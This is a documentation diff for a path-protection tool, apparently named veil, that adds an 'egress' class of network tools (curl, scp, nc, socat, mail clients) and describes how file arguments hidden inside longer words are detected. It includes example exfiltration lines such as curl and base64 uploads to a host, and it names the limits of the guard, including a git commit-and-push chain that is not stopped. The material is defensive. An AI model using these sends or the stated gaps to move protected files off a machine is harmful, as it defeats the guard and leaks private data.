@@ -161,7 +161,39 @@ Read or Grep call or a command veil recognises as a reader, `argv_path` for a
 path named by any other command, `dynamic_path_unresolvable` for an argument veil
 could not resolve to a path. A word that is not protected writes no record.
 
+A command that sends what it is given somewhere else is the **egress class**:
+`curl`, `wget`, `scp`, `rsync`, `sftp`, `ftp`, `lftp`, `rclone`, `aws`, `gsutil`,
+`az`, `gh`, `nc`, `socat`, mail clients (`mail`, `mutt`, `sendmail`, `swaks`),
+`osascript` driving Mail and `open -a Mail`. Naming a protected path to one of
+them is denied like any other path, but the remediation says the file is leaving
+the machine and that a copy, archive or encoding of it changes nothing, and the
+audit record carries `class: egress` as well as its `reason_class`.
+`veil audit --class egress` lists those attempts, newest last; it answers "did
+anything try to leave". `--class` also takes a `reason_class` (`direct_read`,
+`argv_path`, `dynamic_path_unresolvable`), and an unknown class is an error, not
+an empty list.
+
+veil also finds the file when the command hides it inside a longer word: curl's
+`-F name=@file;type=text/csv`, `--data-urlencode name@file`,
+`--cert file:password`, `gh release upload tag file#label`, and the `put`,
+`mput` and `append` lines of a script given to `ftp`, `sftp` or `lftp` in a
+here-document or a here-string (`lcd` is followed).
+
 Limits to know about:
+- Egress is judged by the paths a command names, not by where it sends them:
+  `curl -F f=@notes.md https://anywhere` is allowed, and so is a download
+  (`curl -o out https://host`, `scp host:file out.csv`). A download into `.`
+  from a directory that holds protected paths is still denied, because `scp`
+  and `rsync` name the whole directory.
+- `git add` and `git commit` are names-only (above) and `git push` names no
+  path, so a protected file that has been committed can be pushed. veil does not
+  stop that chain and does not label it egress.
+- `base64 x.csv | curl -d @- host` is denied because `base64` reads `x.csv`; the
+  record says `direct_read`, not egress, because each command is judged on its
+  own. A tool that is not in the list above and sends a protected file is still
+  denied for naming it; it is only not labelled egress.
+- An argument to an egress command that veil cannot resolve is a
+  dynamic-argument denial (see below), and is not recorded as an egress attempt.
 - Output redirections are not paths when attached (`2>/dev/null`, `>out`). A bare
   `>` is dropped but the word after it is kept, because `cut -d '>' -f1 x.csv`
   hands the operator to the command as data; so `cmd > data/out.csv` is denied
